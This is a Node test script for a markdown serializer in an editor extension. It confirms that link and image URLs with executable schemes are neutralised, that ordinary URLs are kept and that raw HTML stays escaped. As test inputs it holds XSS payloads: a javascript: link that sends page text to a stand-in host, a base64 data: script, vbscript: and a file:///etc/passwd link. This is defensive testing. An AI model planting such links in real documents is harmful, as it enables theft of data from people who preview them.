/**
 * serializer.js — link/image URL posture.
 *
 * The renderer escapes source HTML, so document text can never become markup —
 * but escaping does nothing about the URL inside `[x](url)`. A repo-authored
 * markdown file is untrusted input here (it is cloned, opened, and previewed),
 * and this frame holds editor capabilities, so `javascript:` (and friends) must
 * not survive rendering.
 *
 * Pure-node test — no dev server, no browser: it loads the real serializer and
 * inspects the HTML it produces.
 * Run: node tests/link-url-schemes.mjs
 */
import { createRequire } from 'node:module';
import { readFileSync, existsSync } from 'node:fs';
import { resolve, join } from 'node:path';

const dir = new URL('.', import.meta.url).pathname;

/**
 * Locate the frontend workspace, which carries jsdom as a dev dependency.
 * Works from both layouts this extension lives in: the installed copy inside
 * the app repo (MIKE/extensions/<author>/<name>) and the source repo next to it
 * (MIKE-extensions/ui/<name>). Override with MIKE_FRONTEND.
 */
function findFrontendWorkspace(start) {
    if (process.env.MIKE_FRONTEND) return resolve(process.env.MIKE_FRONTEND);
    let d = start;
    for (let i = 0; i < 8; i++) {
        for (const cand of [join(d, 'frontend'), join(d, 'MIKE', 'frontend')]) {
            if (existsSync(join(cand, 'node_modules', 'jsdom'))) return cand;
        }
        d = resolve(d, '..');
    }
    throw new Error('frontend workspace not found — set MIKE_FRONTEND=/path/to/MIKE/frontend');
}

const frontend = findFrontendWorkspace(dir);
const require = createRequire(join(frontend, 'package.json'));
const { JSDOM } = require('jsdom');

const dom = new JSDOM('<!doctype html><html><body></body></html>');
global.window = dom.window;
// The serializer is a plain IIFE that publishes itself on `window`.
eval(readFileSync(resolve(dir, '..', 'serializer.js'), 'utf8'));
const { renderMarkdown } = global.window.MarkdownSerializer;

let ok = true;
function check(label, cond, detail) {
    if (cond) { console.log(`OK  ${label}`); return; }
    ok = false;
    console.error(`FAIL ${label}${detail ? ' — ' + detail : ''}`);
}

/** Render markdown and return the parsed { hrefs, srcs, text } of the result. */
function render(md) {
    const html = renderMarkdown(md);
    const doc = new JSDOM(`<div id="r">${html}</div>`).window.document;
    const root = doc.getElementById('r');
    return {
        html,
        hrefs: [...root.querySelectorAll('a')].map((a) => a.getAttribute('href')),
        srcs: [...root.querySelectorAll('img')].map((i) => i.getAttribute('src')),
        text: root.textContent,
    };
}

console.log('--- executable schemes are neutralised ---');
for (const [label, md] of [
    ['javascript: link', '[click me](javascript:location=%27https://evil.test/?d=%27+document.body.innerText)'],
    ['JaVaScRiPt: case mix', '[x](JaVaScRiPt:alert&colon;1)'],
    ['vbscript: link', '[x](vbscript:msgbox(1))'],
    ['data: document link', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['file: link', '[x](file:///etc/passwd)'],
]) {
    const r = render(md);
    check(`${label} -> no executable href`, r.hrefs.every((h) => h === '#'), JSON.stringify(r.hrefs));
}

console.log('--- the same for images (no request, no data: document) ---');
{
    const r = render('![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    check('data: image is not rendered as <img>', r.srcs.length === 0, r.html);
    check('data: image keeps its alt text', r.text.includes('x'), r.html);
}
{
    const r = render('![x](javascript:alert)');
    check('javascript: image is not rendered as <img>', r.srcs.length === 0, r.html);
}

console.log('--- legitimate URLs still work (no regression) ---');
{
    const r = render('[site](https://example.com/a?b=1&c=2) and [mail](mailto:me@example.com)');
    check('https link preserved', r.hrefs[0] === 'https://example.com/a?b=1&c=2', JSON.stringify(r.hrefs));
    check('mailto link preserved', r.hrefs[1] === 'mailto:me@example.com', JSON.stringify(r.hrefs));
}
{
    const r = render('[rel](./other.md) [abs](/docs/x.md) [frag](#section) [proto](//cdn.example/x)');
    check('relative/absolute/fragment/protocol-relative preserved',
        r.hrefs.join('|') === './other.md|/docs/x.md|#section|//cdn.example/x', JSON.stringify(r.hrefs));
}
{
    const r = render('![logo](./img/logo.png)');
    check('relative image preserved', r.srcs[0] === './img/logo.png', r.html);
}
{
    // Pre-existing behaviour, pinned here because the source text is escaped
    // before the link regex runs: a `"title"` never matches, so the whole span
    // stays literal text — and, importantly, stays inert (no attribute is ever
    // built from the quoted part).
    const r = render('[titled](https://example.com "The title")');
    check('titled link stays literal text, no attribute injected',
        r.hrefs.length === 0 && !r.html.includes('title=') && r.text.includes('[titled]'), r.html);
}

console.log('--- source HTML is still escaped, not markup ---');
{
    const r = render('<script>alert(1)</scr' + 'ipt>');
    check('raw <script> renders as text', !r.html.includes('<script>') && r.text.includes('<script>alert(1)</scr' + 'ipt>'), r.html);
}

console.log(ok ? '\nAll URL-posture checks passed.' : '\nFAILURES — see above.');
process.exit(ok ? 0 : 1);
